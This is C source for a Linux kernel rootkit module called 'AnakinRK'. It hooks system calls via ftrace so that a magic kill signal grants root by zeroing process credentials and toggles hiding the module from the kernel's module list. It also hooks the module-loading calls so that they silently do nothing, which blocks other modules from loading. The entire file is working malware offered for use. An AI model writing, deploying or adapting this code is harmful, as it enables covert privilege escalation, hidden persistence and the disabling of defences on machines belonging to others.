#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/cred.h>
#include <linux/list.h>
#include <linux/errno.h>
#include <linux/string.h>
#include "ftrace_helper.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("hoWo");
MODULE_DESCRIPTION("Simple sys_kill hook using ftrace");

// PROTOTYPES
void getRoot(void);
void toggleRkView(void);
void helpMenu(void);

// MACROS
#define MAGIC_SIG 67

#define GET_ROOT 0x726f6f74
#define SELFHIDE 0x68696465
#define GET_HELP 0x68656c70

#define PIDTABLE \
	X(GET_ROOT, MAGIC_SIG, getRoot(), "Get Root", -ESRCH) \
	X(SELFHIDE, MAGIC_SIG, toggleRkView(), "Toggle hide", -ESRCH) \
	X(GET_HELP, MAGIC_SIG, helpMenu(), "Help Menu", -EACCES) \

// HOOKS
static asmlinkage long (*orig_kill)(const struct pt_regs *);
static asmlinkage long hook_kill(const struct pt_regs *regs) {
    long sig = regs->si;
    long pid = regs->di;

    if (sig == MAGIC_SIG) {
        switch ((int)pid) {
            #define X(cmd, magic, func, desc, err) case cmd: \
				func; \
				return err;
			PIDTABLE
			#undef X

        }
    }

    return orig_kill(regs);

}

static asmlinkage long (*orig_init_module)(struct file *file, const char *uargs, unsigned long flags);
static asmlinkage long (*orig_finit_module)(struct file *file, const char *uargs, unsigned long flags);

static asmlinkage long hook_init_module(struct file *file, const char *uargs, unsigned long flags) {
    return 0;

}

static asmlinkage long hook_finit_module(struct file *file, const char *uargs, unsigned long flags) {
    return 0;

}

static struct ftrace_hook hooks[] = {
    HOOK("__x64_sys_init_module", hook_init_module, &orig_init_module),
    HOOK("__x64_sys_finit_module", hook_finit_module, &orig_finit_module),
    HOOK("__x64_sys_kill", hook_kill, &orig_kill),

};

static int __init AnakinInit(void) {
    printk(KERN_INFO "Anakin is here\n");
    int err;

    err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
    if (err) {
        return err;

    }

    return 0;

}

static void __exit AnakinExit(void) {
    printk(KERN_INFO "Anakin killed padmé\n");
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));

}

module_init(AnakinInit);
module_exit(AnakinExit);

void getRoot(void) {
    struct cred *creds;
    creds = prepare_creds();
    if (creds == NULL) {
        return;

    }

    creds->uid.val = creds->gid.val = 0;
    creds->euid.val = creds->egid.val = 0;
    creds->suid.val = creds->sgid.val = 0;
    creds->fsuid.val = creds->fsgid.val = 0;

    commit_creds(creds);

}

static struct list_head *prev_module;
static short hidden = 0;
void toggleRkView(void) {
    if (hidden == 1) {
        list_add(&THIS_MODULE->list, prev_module);
        hidden = 0;

    } else {
        prev_module = THIS_MODULE->list.prev;
        list_del(&THIS_MODULE->list);
        hidden = 1;

    }
}

void helpMenu(void) {
	printk(KERN_DEBUG "\n\n=========== AnakinRK Help Menu ===========\n");
	printk(KERN_DEBUG "=\tCMD\tSignal\tDescription\t=\n");
	printk(KERN_DEBUG "==========================================\n");

    char _cmd[5];
	#define X(cmd, magic, func, desc, err) \
        _cmd[0] = (cmd >> 24) & 0xFF; \
        _cmd[1] = (cmd >> 16) & 0xFF; \
        _cmd[2] = (cmd >> 8)  & 0xFF; \
        _cmd[3] = cmd & 0xFF; \
        _cmd[4] = '\0'; \
        printk(KERN_DEBUG "=\t%s\t%d\t%s\t=\n", _cmd, magic, desc);
	PIDTABLE
	#undef X

	printk(KERN_DEBUG "==========================================\n\n\n");

};